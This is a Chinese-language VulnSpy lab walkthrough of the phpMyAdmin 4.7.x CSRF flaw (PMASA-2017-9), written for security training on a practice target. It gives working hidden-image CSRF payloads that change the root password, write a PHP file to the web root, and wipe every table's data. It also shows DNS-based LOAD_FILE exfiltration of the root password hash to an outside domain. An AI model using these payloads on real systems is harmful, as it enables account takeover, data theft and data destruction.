<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Ambulong">
<meta name="description" content="phpMyAdmin是个知名MySQL/MariaDB在线管理工具，phpMyAdmin团队在4.7.7版本中修复了一个危害严重的CSRF漏洞 PMASA-2017-9 ，攻击者可以通过诱导管理员访问恶意页面，悄无声息地执行任意SQL语句。">
<meta name="keywords" content="pma,phpMyAdmin,csrf,xsrf,vulnerability,security,security,practict,在线靶场,黑客技术,网络安全,信息安全,漏洞测试,CTF在线,渗透测试,在线练习,演练,实验,pentest,online">
<title>phpMyAdmin 4.7.x CSRF 漏洞利用 | VULNSPY</title>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<script src="/js/jquery-1.11.3.min.js"></script>
<script src="/js/jquery-migrate-1.2.1.min.js"></script>
<link href="/css/bootstrap.min.css" rel="stylesheet">
<link href="/css/ie10-viewport-bug-workaround.css" rel="stylesheet">
<!--[if lt IE 9]><script src="/js/ie8-responsive-file-warning.js"></script><![endif]-->
<script src="/js/ie-emulation-modes-warning.js"></script>
<!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
<![endif]-->
<script src="/js/bootstrap.min.js"></script>
<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
<script src="/js/ie10-viewport-bug-workaround.js"></script>
<link rel="stylesheet" href="/css/custom.css" />
<link rel="stylesheet" href="css/prism.css" />
<script src="/js/functions.js"></script>
<script src="/js/custom.js"></script>
<script>
function GetQueryString(name)
{
     var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
     var r = window.location.search.substr(1).match(reg);
     if(r!=null)return  unescape(r[2]); return null;
}
var lang="en";
var la=(navigator.language) ? navigator.language.toLowerCase() : navigator.userLanguage.toLowerCase();
if(la=='zh-cn' || la=='zh-tw' || la=='zh-hk'){
	lang="cn";
}
</script>
<!--[if lt IE 9]>
	<script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
<![endif]-->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-108901411-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-108901411-2');
</script>
</head>
<body>
<div class="view-header" style="z-index: 999;">
    <ul>
    	<li><a href="/"><h1><img style="width:1.5em;height: auto;margin-top: -0.3em;" src="/images/owl2.png" /></h1></a></li>
        <li ><a href="/">VULNSPY</a></li>
        <li><a href="https://blog.vulnspy.com/">BlOG</a></li>
        <div class="pull-right">
            <li><a target="_blank" href="https://www.reddit.com/r/jiuwu/">REDDIT</a></li>
            <li><a target="_blank" href="https://www.youtube.com/channel/UCnqjUDkrZ0OFwZvxxiC47gw">YOUTUBE CHANNEL</a></li>
        </div>
    </ul>
</div>
<style>
.main{
	
	margin: 0 auto;
	margin-top: 7em;
	max-width: 90em;
	width: 95%;
}
.lab{
	float:left;
	width: 77%;
}
.lab h1{
	padding: 0;
	font-size: 230%;
	margin: 20px 0;
	line-height: 1.5em;
}

.lab .demo{
	font-size: 115%;
	line-height: 2em;
	border: 1px solid #ccc;
	background: #2C3844;
	margin: 1.8em 0 1em 0;
}
.lab .demo .demo-btn{
	text-align: center;
	font-size: 150%;
	margin: 0.3em 0;
	color: #FFF;
}
.lab .demo .demo-btn a{
	background: transparent;
	padding: 1em;
	font-size: 100%;
	display: block;
	
}
.lab .demo .demo-link{
	background: rgba(0,0,0,.25);
}
.lab .demo a{
	font-size: 50%;
	text-transform: uppercase;
	padding: 0 0.5em;
	color: #FFF;
}
.lab .content{
	font-size: 130%;
	line-height: 1.5em;
}
.lab .content p{
	margin: 1em 0;
}
.lab .content img{
	max-width: 100%;
	margin: 1em 0;
}
.sidebar{
	width: 23%;
	float: left;
	padding-left: 2em;
	margin-top: 20px;
}
.sidebar .sth-btn {
	width: 100%;
	margin-left: 1em;
}
#sth {
	display: block;
	text-align: center;
	text-transform: uppercase;
	padding: 0.8em 1em;
	font-size:123%;
	border: none;
	border-radius: 0;
	background: #337ab7;
	color: #FFF;
	font-weight: bold;
}
#demo-notice {
	width: 100%;
	margin: 0.8em 0;
	font-size: 90%;
	text-align: center;
	color: #777;
	word-break:break-all;
}
.sidebar ul{
	margin: 2em 0;
	padding: 0;
}
.sidebar ul ul{
	margin: 0;
	margin-left: 1em;
}
.sidebar li{
	margin: 0 0 0.5em 0;
	font-size: 110%;
	list-style: none;
	color: #767676;
	border-left: solid 0.1em #FFF;
	padding-left: 1em;
	margin-left: 1em;
	cursor: pointer;
}
.sidebar li.selected{
	color: #2C3844;
	border-left: solid 0.1em #2C3844;
}
.sidebar li:hover{
	color: #2C3844;
	border-left: solid 0.1em #2C3844;
}
</style>
<div class="main">
	<div class="lab">
		<h1>phpMyAdmin 4.7.x CSRF 漏洞利用</h1>
		<hr/>
		<div class="content"><p>phpMyAdmin是个知名MySQL/MariaDB在线管理工具，phpMyAdmin团队在4.7.7版本中修复了一个危害严重的CSRF漏洞（<a href="https://www.phpmyadmin.net/security/PMASA-2017-9/">PMASA-2017-9</a>），攻击者可以通过诱导管理员访问恶意页面，悄无声息地执行任意SQL语句。</p>
<p>该篇文章我们将结合VulnSpy的<a href="https://www.vulnspy.com/?u=pmasa-2017-9">在线phpMyAdmin环境</a>来熟悉该漏洞的利用。</p>
<p><strong>在线 phpMyAdmin CSRF 演练地址：<a href="https://www.vulnspy.com/?u=pmasa-2017-9">https://www.vulnspy.com/?u=pmasa-2017-9</a></strong></p>
<p>注：重启演示靶机即可重置靶机</p>
<h2>1 在线创建 phpMyAdmin 环境</h2>
<p>点击 VulnSpy 提供的创建靶机地址（<a href="https://www.vsplate.com/?github=vulnspy/PMASA-2017-9">https://www.vsplate.com/?github=vulnspy/PMASA-2017-9</a>）</p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.1.png" alt="VulnSpy" title="VulnSpy" /></p>
<p>跳转到 VSPlate 后，直接点击<code>GO</code>按钮，便会自动创建一个 phpMyAdmin 环境</p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.2.png" alt="VSPlate GO" title="VSPlate GO" /></p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.3.png" alt="VSPlate Labs" title="VSPlate Labs" /></p>
<p>打开<code>演示地址</code>的链接，我们的 phpMyAdmin 就创建完成了。</p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.4.png" alt="VSPlate Demo" title="VSPlate Demo" /></p>
<p>使用帐号 <code>root</code> ，密码 <code>toor</code> ，登录 phpMyAdmin 。根据页面信息，我们可以发现当前 phpMyAdmin 的版本为 4.7.6，刚好匹配存在漏洞的 phpMyAdmin 版本。</p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.5.png" alt="VSPlate Demo 2" title="VSPlate Demo 2" /></p>
<h2>2 CSRF 漏洞利用 - 修改当前数据库用户密码</h2>
<p>我们知道，如果要利用CSRF来删除或修改数据库内容，通查情况下需要提前知道数据库名、表名和字段名。这样利用显得有点复杂，成功率也有限，因此本文我们将介绍几种较为通用的利用方式。</p>
<p>在MySQL中支持使用SQL语句来修改当前用户密码。比如将当前用户密码修改为<code>www.vulnspy.com</code>，对应的SQL语句为：</p>
<pre><code class="language-sql">SET passsword=PASSWORD('www.vulnspy.com');</code></pre>
<h3>利用演示</h3>
<p><strong>2.1 模拟管理员登录phpMyAdmin的状态。</strong></p>
<p>用帐号 root 密码 toor 登录 phpMyAdmin 。</p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.1.1.png" alt="phpMyAdmin" title="phpMyAdmin" /></p>
<p><strong>2.2 创建含有恶意代码的页面。</strong></p>
<p>文件名 2.payload.html （将下面的域名换成自己的靶机域名）</p>
<pre><code class="language-html">&lt;p&gt;Hello World&lt;/p&gt;
&lt;img src="http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password
%20=%20PASSWORD(%27www.vulnspy.com%27)" style="display:none;" /&gt;</code></pre>
<p><strong>2.3 用浏览器打开含有恶意代码的文件 2.payload.html</strong></p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.3.1.png" alt="2.payload.html" title="2.payload.html" /></p>
<p>回到上一步打开的phpMyAdmin页面，发现已自动退出，而且用原来的密码 toor 已经无法登录。</p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.3.2.png" alt="2.payload.html 2" title="2.payload.html 2" /></p>
<p><strong>2.4 使用密码 www.vulnspy.com 登录成功，表明利用成功</strong></p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.4.1.png" alt="Password Changed" title="Password Changed" /></p>
<h2>3 CSRF 漏洞利用 - 写文件</h2>
<p>MySQL支持将查询结果写到文件当中，我们可以利用该特性来写入PHP文件。比如将代码<code>&lt;?php phpinfo();?&gt;</code>写到文件<code>/var/www/html/test.php</code>中，对应的SQL语句为：</p>
<pre><code class="language-sql">select '&lt;?php phpinfo();?&gt;' into outfile '/var/www/html/test.php';</code></pre>
<h3>利用演示</h3>
<p><strong>3.1 将上一个演示步骤相同，只需将2.2中的文件代码改成：</strong></p>
<pre><code class="language-html">&lt;p&gt;Hello World&lt;/p&gt;
&lt;img src="http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=select '&lt;?php phpinfo();?&gt;' into outfile '/var/www/html/test.php';" style="display:none;" /&gt;</code></pre>
<p><strong>3.2 用浏览器打开含有恶意代码的文件</strong></p>
<p><strong>3.3 访问 test.php</strong></p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.1.png" alt="VulnSpy" title="VulnSpy" /></p>
<p>可见文件已经写入成功。</p>
<h2>4 CSRF 漏洞利用 - 获取数据</h2>
<p>MySQL提供了<code>load_file()</code>函数来支持读取文件内容的操作。比如读取文件<code>/etc/passwd</code>内容，，对应的SQL语句为：</p>
<pre><code class="language-sql">select load_file('/etc/passwd');</code></pre>
<p>但是对于CSRF漏洞来说，该读取操作实在目标用户端执行的，我们依然无法知道文件读取的结果。而<code>load_file()</code>在Windows下支持从网络共享文件夹中读取文件，如<code>\\192.168.1.100\share\vulnspy.txt</code>。网络共享文件的地址处不仅可以填写IP还可以填写域名，我们可以通过DNS解析来获取查询的数据。</p>
<p><em>此处需要用到 DNSLOG 之类的工具：<a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a>， 这类工具可以记录域名的 DNS 解析记录</em></p>
<p>比如通过DNS解析来获取当前 MySQL root 用户密码，对应的SQL语句为：</p>
<pre><code class="language-sql">SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.vulnspy.com\\test'));</code></pre>
<p>获取当前数据库名：</p>
<pre><code class="language-sql">SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.vulnspy.com\\test'));</code></pre>
<p>如果请求成功，查询结果将作为二级域名的一部分出现在我们的 DNS 解析记录当中。</p>
<p><strong>该环境暂无法演示</strong></p>
<h2>5 CSRF 漏洞利用 - 清空所有数据表</h2>
<p>如果上面几种利用方式都无法直接造成直接的影响，我们可以利用SQL语句来清空当前MySQL用户可操作的所有数据表。</p>
<p>我们用命令</p>
<pre><code class="language-sql">SELECT CONCAT('DELETE FROM ',TABLE_SCHEMA,'.',TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE '%_schema' and TABLE_SCHEMA!='mysql' LIMIT 0,1</code></pre>
<p>来获取数据名和表名，并将其拼接成删除语句（如：<code>DELETE FROM vulnspy_tables.inv</code>），通过 <code>execute</code> 来执行生成的删除语句：</p>
<pre><code class="language-sql">set @del = (SELECT CONCAT('DELETE FROM ',TABLE_SCHEMA,'.',TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE '%_schema' and TABLE_SCHEMA!='mysql' LIMIT 0,1);
prepare stmt from @del;
execute stmt;</code></pre>
<p>但是 execute 一次只能执行一条SQL语句，因此我们可以利用循环语句来逐一执行：</p>
<pre><code class="language-sql">DROP PROCEDURE IF EXISTS EMPT;
DELIMITER $$
    CREATE PROCEDURE EMPT()
    BEGIN
        DECLARE i INT;
        SET i = 0;
        WHILE i &lt; 100 DO
            SET @del = (SELECT CONCAT('DELETE FROM ',TABLE_SCHEMA,'.',TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE '%_schema' and TABLE_SCHEMA!='mysql' LIMIT i,1);
            PREPARE STMT FROM @del;
            EXECUTE STMT;
            SET i = i +1;
        END WHILE;
    END $$
DELIMITER ;

CALL EMPT();</code></pre>
<h3>利用演示</h3>
<p><strong>5.1 Payload如下</strong></p>
<pre><code class="language-html">&lt;p&gt;Hello World&lt;/p&gt;
&lt;img src="http://7f366ec1afc5832757a402b5355132d0.vsplate.me/import.php?db=mysql&amp;table=user&amp;sql_query=DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A" style="display:none;" /&gt;</code></pre>
<p><strong>5.2 用浏览器打开含有恶意代码的文件</strong></p>
<p><strong>5.3 回到 phpMyAdmin 中查看数据</strong></p>
<p>可以发现数据库<code>vulnspy_tables</code>和数据库<code>vulnspy_test</code>中的数据已经被清空。</p>
<p><img src="/images/cn-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/5.3.1.png" alt="Empty DBS" title="Empty DBS" /></p>
<h2>6 总结</h2>
<p>这个 phpMyAdmin 的 CSRF 漏洞利用有点类似 SQL 盲注的利用，但是对于漏洞触发的时间不可控（即不知道管理员何时会访问含有恶意代码的页面），因此需要更加通用的利用方式。通过该实验，不仅了解该漏洞的内容，还可以更加熟悉CSRF漏洞的利用。</p>
<h3 style="margin-top:1.5em;">GitHub Source</h3>
<p><a href="https://github.com/vulnspy/PMASA-2017-9" target="_blank">https://github.com/vulnspy/PMASA-2017-9</a></p>
<h3 style="margin-top:1.5em;">Reference</h3>
<p style="text-align:left;">
PMASA-2017-9 - <a href="https://www.phpmyadmin.net/security/PMASA-2017-9/">https://www.phpmyadmin.net/security/PMASA-2017-9/</a><br>
CSRF Vulnerability in phpMyAdmin allows attackers to perform DROP TABLE with a single click! - <a href="https://securityaffairs.co/wordpress/67243/hacking/phpmyadmin-csrf-vulnerability.html">https://securityaffairs.co/wordpress/67243/hacking/phpmyadmin-csrf-vulnerability.html</a><br>
phpMyAdmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9) Exploit - <a href="https://blog.vulnspy.com/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/">http://blog.vulnspy.com/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/</a><br>
phpMyAdmin 4.7.x CSRF 漏洞利用 - <a href="https://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/">http://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/</a></div>
	</div>
	<div class="sidebar">
		<div class="sth-btn">
			<a id="sth" target="_blank" href="https://www.vsplate.com/?github=vulnspy/PMASA-2017-9&amp;autogo=1">start to hack</a>
			<p id="demo-notice">Click the button and start the playing.</p>
		</div>
		<ul>
			<li href="#" class="nlink selected"># TOP</li>
		</ul>
	</div>
</div>
<script>
if(lang == 'cn'){
	$("#demo-notice").html("点击上方按钮开启实验.");
}
$(document).ready(function(){

$.extend({
	genMenu: function() {
		var html = '';
		var prevH = 'h0';
		var toClose = 0;
		$(".content").children("h1,h2,h3,h4,h5").each(function(i,e){
			var tagName = $(e)[0].tagName.toLowerCase();
			//var menuName = 'M-'+window.btoa($(e).text());
			var menuName = 'M-'+randomString(6)+'-'+$(e).text().replace(/\ +/g,"-");
			$(e).attr('id',menuName);
			if(tagName > prevH){
				html = html+'<ul>';
				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
				toClose = toClose + 1;
			}else if(tagName == prevH){
				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
			}else if(tagName < prevH){
				html = html+'</ul>';
				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
				toClose = toClose - 1;
			}
			prevH = tagName;
		});
		while(toClose > 0){
			html = html+'</ul>';
			toClose = toClose - 1;
		}
		$(".sidebar ul").remove();
		$(".sidebar").append(html);
		$(".sidebar ul:first").prepend('<li class="menu-item nlink selected" href="#"># TOP</li>');
		return html;
	}
});
$.extend({
	selectMenu: function() {
		var mintoTop = 20;
		var menu = [];
		$("li.menu-item").each(function(i,e){
			id = $(e);
			if(id && id != '#'){
				menu.push(id);
			}
		});
		for(var i=menu.length;i>0;i--){
			mid = menu[i-1].attr('href');
			var toTop = $(mid).offset().top-$(document).scrollTop();
			if(toTop <= mintoTop){
				$("li.menu-item").removeClass('selected');
				menu[i-1].addClass('selected');
				break;
			}
		}
		return mid;
	}
});
$.extend({
	fixSidebar: function() {
		var sidebarTop = $(".sidebar").offset().top-$(document).scrollTop();
		if($(document).scrollTop() < 120){
			$(".sidebar").css("margin-top", "20px");
		}else if(sidebarTop < 20){
			$(".sidebar").css("margin-top", ($(document).scrollTop()-80)+"px");
		}else if(sidebarTop > 20 && $(document).scrollTop() > 120){
			$(".sidebar").css("margin-top", ($(document).scrollTop()-80)+"px");
		}
	}
});
$.genMenu();
$(window).scroll(function(){
	$.fixSidebar();
	$.selectMenu();
});

});
</script>
<div style="float:left;width:100%;text-align:center;margin-top:5em;background: #000;color: #FFF;">
	<div style="margin:0 auto;width:95%;max-width:90em;padding:1em 0;">All rights reserved. &copy; 2018 VULNSPY</div>
</div>
<script>
$(function () {
	$("pre code").closest("pre").addClass("line-numbers ");
});
</script>
<script src="/js/prism.js"></script>
</body>
</html>
